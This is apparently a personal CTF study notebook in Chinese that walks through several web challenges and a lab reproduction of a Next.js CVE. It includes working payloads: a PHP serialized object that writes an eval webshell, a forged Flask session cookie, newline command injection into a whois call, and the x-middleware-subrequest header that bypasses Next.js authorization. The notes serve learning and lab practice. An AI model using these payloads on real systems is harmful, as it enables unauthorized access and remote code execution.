# 0x01 网鼎杯 2020 朱雀组【phpweb】
进去看到报错
![[file-20251219163414701.png]]
看到这里是调用了`data()`函数，抓包看看
![[file-20251219163619250.png]]
应该就是`func`：函数名；`p`：参数
试着`file_get_contents`读一下`index.php`
得到源码：
```php
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```
直接传参会有waf，注意到有个`__destruct`，这里也调用了`gettime`，并且没有waf；
![[file-20251219172323661.png]]
其实这里可以直接通过
`call_user_func("system","cat /flag");`这样getflag，但是这里m神让写马，上面这样能命令执行了，但是这不是一次性的吗，不太懂怎么连接的，试了文件写入，好像也没权限，本地试了一下，可以写文件，题目应该是限制了权限
```php
O:4:"Test":2:{s:1:"p";s:57:"file_put_contents('abc.php','<?=eval($_POST["cmd"]);?>');";s:4:"func";s:6:"assert";}
```
也可以像这样：
```php
<?php
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";

}

$test = new Test();


$test->func="assert";
$test->p='eval($_POST["1"]);';


echo serialize($test);
```
但是这样只有一次呀，当时可以执行，这咋连接。。。
后面了解了一下，蚁剑可以直接设置发包的参数，直接连接就好了
这里是php版本5.几，所以还可以调用`assert`，但是7版本之后assert也变成语言结构了，所以就不能写马了，
![](assets/Day%203/file-20251220014214991.png)
或者还有其他方法，以后再了解一下。

# 0x02 CISCN2019 华东南赛区【Web4】
进去是一个链接，但是打不开了，（不知道为什么）但是查看源代码发现是传一个url参数，猜测是ssrf，尝试之后也没反应，也可能是文件包含，再试试，果然能读到
![600](assets/Day%203/file-20251220021309697.png)
抓包在读一下其他文件，同时也发现了存在特殊的cookie
![500](assets/Day%203/file-20251220021354705.png)
以为是jwt，尝试解码一下
![500](assets/Day%203/file-20251220021551745.png)
这看着也不是常规的jwt。这里我们也查到了当前进程存在的文件，所以直接看源码了
```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```
逻辑很简单
`/read`路由是一个urlopen输入的，这里可以理解为文件读取
`/flag`路由就是查看flag的，但是这里会检查我们的session，所以应该就是一个session伪造，刚好前两天面试也问到了flask的session，这里学习一下。
我们看到session生成规则：
```python
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True
```
这里是一个伪随机数，设置了种子的，还要了解一下`uuid.getnode()`
![](assets/Day%203/file-20251220022618712.png)
看到这里值是和mac地址有关，学了一下怎么获得mac地址
`/sys/class/net/eth0/address`
这是linux中存储mac地址的地方
![](assets/Day%203/file-20251220023000279.png)
了解了一下，flask的session是会和`secret_key`有关的，有了这个key就可以用工具直接伪造了。
这里我们直接按照逻辑得到`secret_key`
我们通过脚本可以得到mac对应的key
```python
import uuid
import random

mac = "2e:b0:8f:54:a6:f4"
temp = mac.split(':')
temp = [int(i,16) for i in temp]
temp = [bin(i).replace('0b','').zfill(8) for i in temp]
temp = ''.join(temp)
mac = int(temp,2)
random.seed(mac)
randStr = str(random.random()*233)
print(randStr)
```
(注意这里还只有用python2跑脚本，不知道为什么，python3跑精度不一样)没有环境可以用在线网站跑
https://www.jyshare.com/compile/6/
```bash
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833'
{'username': b'www-data'}
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833095'
[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
```
我们这里需要`username=fuck`，用工具改一下：
```bash
PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  encode -s '74.8534422833' -t "{'username': b'fuck'}"
eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
```
然后访问flag路由就好了，注意这里，我们伪造是只需要key的，因为后面的签名和前面有关
![500](assets/Day%203/file-20251220030430083.png)

# 0x04 HackINI  2023 【just-work-type】
简单的jwt伪造
爆破jwt密钥
![400](assets/Day%203/file-20251220120645844.png)
然后伪造cookie发包就好了。
![500](assets/Day%203/file-20251220120717636.png)
# 0x05 HackINI  2021【sqli-0x1】
查看源码提示了代码审计

![500](assets/Day%203/file-20251220222939741.png)

我们大概浏览一下。

首先是黑名单过滤，反引号过滤了，还有引号不能接空格；

接下来主要看最下面的验证，因为根际下面的html代码，只要`$logged`为真就返回flag

![500](assets/Day%203/file-20251220223003149.png)

所以主要看这一块

```php
if (isset($_POST["user"]) && isset($_POST["pass"]) && (!empty($_POST["user"])) && (!empty($_POST["pass"]))) {
    $user = $_POST["user"];
    $pass = $_POST["pass"];
    if (is_trying_to_hak_me($user)) {
        die("why u bully me");
    }

    $db = new SQLite3("/var/db.sqlite");
    $result = $db->query("SELECT * FROM users WHERE username='$user'");
    if ($result === false) die("pls dont break me");
    else $result = $result->fetchArray();

    if ($result) {
        $split = explode('$', $result["password"]);
        $password_hash = $split[0];
        $salt = $split[1];
        if ($password_hash === hash("sha256", $pass.$salt)) $logged_in = true;
        else $err = "Wrong password";
    }
    else $err = "No such user";
}
```

发现会根据查询结果，得到其中的password字段，再它通过$分割为`$password_hash`和`$salt`,然后，从我们输入的密码中获取`$pass`最后把我们输入的密码和查询结果中分出来的`$salt`拼接，并sha256加密。得到的加密结果在和查询结果中分出来的`$password_hash`对比，相等就会返回真。

分析完我们构造payload；

```php
<?php
$pass=999;
$salt=888;
$result = hash("sha256", $pass.$salt);
echo $result;

#$result=685f188e4f25af63603dc5b579b31090f459381a242bf7002c8a8e8ea322a4ef
```

这个脚本会得到哪个sha256的值。

我们把这个值拼接一下`685f188e4f25af63603dc5b579b31090f459381a242bf7002c8a8e8ea322a4ef$888`

这样，如果我们让查询结果为这个值，那会分出来，`sha256编码`和一个`$salt`,然后我们`$pass`提交一个999

（这个是999的sha2256编码），此时

```php
$password_hash = '685f188e4f25af63603dc5b579b31090f459381a242bf7002c8a8e8ea322a4ef'
$pass = '999'
$salt = '888'
#hash("sha256", "999"."888") = 685f188e4f25af63603dc5b579b31090f459381a242bf7002c8a8e8ea322a4ef
```

就饶过了

![500](assets/Day%203/file-20251220223038158.png)

这里a是一个不存在的，所以没结果，所以回显的结果就会是我们查询的1和一个编码字符串，这里提取的是password字段，那应该就是第二个，所以才把编码字符串放在2的位置。

![500](assets/Day%203/file-20251220223046713.png)

# 0x06 HackINI  2022 【Whois】
得到源码
```php
<?php

error_reporting(0);

$output = null;
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
$query_regex = "/^[0-9a-zA-Z\. ]+$/";


if (isset($_GET['query']) && isset($_GET['host']) && 
      is_string($_GET['query']) && is_string($_GET['host'])) {

  $query = $_GET['query'];
  $host = $_GET['host'];
  
  if ( !preg_match($host_regex, $host) || !preg_match($query_regex, $query) ) {
    $output = "Invalid query or whois host";
  } else {
    $output = shell_exec("/usr/bin/whois -h ${host} ${query}");
  }

} 
else {
  highlight_file(__FILE__);
  exit;
}

?>

<!DOCTYPE html>
<html>
  <head>
    <title>Whois</title>
  </head>
  <body>
    <pre><?= htmlspecialchars($output) ?></pre>
  </body>
</html>
```

重点在`shell_exec("/usr/bin/whois -h ${host} ${query}")`，可以拼接命令，但是又不允许有`;`，linux中允许`;`或换行符`\n`分割命令。如：

![500](assets/Day%203/file-20251220223404369.png)

所以我们这里可以用换行符，注意要用`%0a`

![800](assets/Day%203/file-20251220223412787.png)

# 0x07 Next.js 中间件鉴权绕过漏洞 (CVE-2025-29927)
## 漏洞描述

CVE-2025-29927 是 Next.js 框架中发现的一个严重授权绕过漏洞。该漏洞允许攻击者通过伪造特定的 HTTP 请求头，绕过中间件中的授权检查，从而未经授权地访问受保护的资源。此问题影响了使用“next start”命令并设置“output: 'standalone'”的自托管 Next.js 应用程序。

Next.js 使用内部头字段“x-middleware-subrequest”来防止递归请求导致的无限循环。攻击者可以通过在请求中伪造该头字段，跳过中间件的执行，从而绕过关键的安全检查，例如授权 Cookie 验证。

### 受影响的版本

==Next.js 15.x < 15.2.3

==Next.js 14.x < 14.2.25

==Next.js 13.x < 13.5.9

### 影响范围

使用中间件的自托管 Next.js 应用程序（next start with output： standalone）

依赖 Middleware 进行身份验证或安全检查的应用程序，稍后不会在应用程序中进行验证

## 环境搭建

使用 p 神的[https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md)

可以把vulhub都gitclone下来。然后进对应的文件夹`docker-compose up -d`

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulhub/next.js/CVE-2025-29927]
└─# docker-compose up -d
Creating network "cve-2025-29927_default" with the default driver
Pulling web (vulhub/nextjs:15.2.2)...
15.2.2: Pulling from vulhub/nextjs
6e909acdb790: Pull complete
d714f4673cad: Pull complete
be84add755f8: Pull complete
9a8d89ceeab1: Pull complete
4c07c1809c8e: Pull complete
a98958ee95bc: Pull complete
23bec30f180e: Pull complete
bf031c299822: Pull complete
Digest: sha256:d4df62ece026292a8068bf48667fd8ad44b31120237ff302de294da88d7ee018
Status: Downloaded newer image for vulhub/nextjs:15.2.2
Creating cve-2025-29927_web_1 ... done

```

![](assets/Day%203/file-20251220223741944.png)

看到在3000端口启动了对应环境

## 漏洞复现

启动环境后访问`you_ip:3000`

自动重定向到了`/login`路由。

![500](assets/Day%203/file-20251220223753598.png)

需要我们登录，我们可以输入admin：password登录。

  

如果我们不知道密码的情况下，可以利用该漏洞实现越权登录：

我们添加请求头(注意我们要访问的不是login路由，是根目录)

```HTTP
x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware
```

![700](assets/Day%203/file-20251220224019593.png)

可以看到成功确权访问了admin管理界面

## 漏洞原理

看文章[Next.js 中间件鉴权绕过漏洞 (CVE-2025-29927)-先知社区](https://xz.aliyun.com/news/17406)

关键代码

```javascript
export const run = withTaggedErrors(async function runWithTaggedErrors(params) {
const runtime = await getRuntimeContext(params)
const subreq = params.request.headers[`x-middleware-subrequest`]
const subrequests = typeof subreq === 'string' ? subreq.split(':') : []

const MAX_RECURSION_DEPTH = 5
const depth = subrequests.reduce(
  (acc, curr) => (curr === params.name ? acc + 1 : acc),
  0
)

if (depth >= MAX_RECURSION_DEPTH) {
  return {
    waitUntil: Promise.resolve(),
    response: new runtime.context.Response(null, {
      headers: {
        'x-middleware-next': '1',
      },
    }),
  }
}
```

会检查请求头，`x-middleware-subrequest`，并按`:`分割值。

当递归深度大于`MAX_RECURSION_DEPTH = 5`时，会绕过中间件的检查继续后续内容。

### 中间件：
Next.js中可以用于在请求到达 API 路由或页面组件之前执行全局逻辑，比如身份验证、请求拦截、重定向等。就是在执行请求前执行一些动作。（在该环境下就是在请求前进行身份验证）

### x-middleware-subrequest头：
为了防止一直递归调用进入死循环而设计。比如：请求一个地址，发现没有登录，于是跳转到login，但是此时还是没有登录，于是又会调用中间件，这样会造成重复递归调用。此时有`x-middleware-subrequest头`，中间件检测到它，就知道这里已经检测过了，就可以跳过这次检测。

所以我们要伪造请求头`x-middleware-subrequest`：根据检查后面的值为中间件名，而规定中间件名为，所以我们填5个`middleware`即可绕过检测。

他的路径通常在根目录`/middleware`或者src目录`/src/middleware`,所有我们的payload为

```http
x-middleware-subrequest:middleware:middleware:middleware:middleware:middleware
```

```http
x-middleware-subrequest:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

## [WatCTF 2025 ]Waterloo Trivia Dash

![500](assets/Day%203/file-20251220224230189.png)

答完三道题后得到一个按钮，按了没反应，于是复制连接看一下。

`http://112.124.64.34:3080/admin`，是一个admin路由，抓包看

![](assets/Day%203/file-20251220224256641.png)

访问之后会307跳转到根路由。

我们信息收集一下

![500](assets/Day%203/file-20251220224308801.png)

发现是Next.js版本15.2.2 < 15.2.3 存在已知的漏洞。我们尝试攻击

![](assets/Day%203/file-20251220224316653.png)

该题的中间件是在src目录下。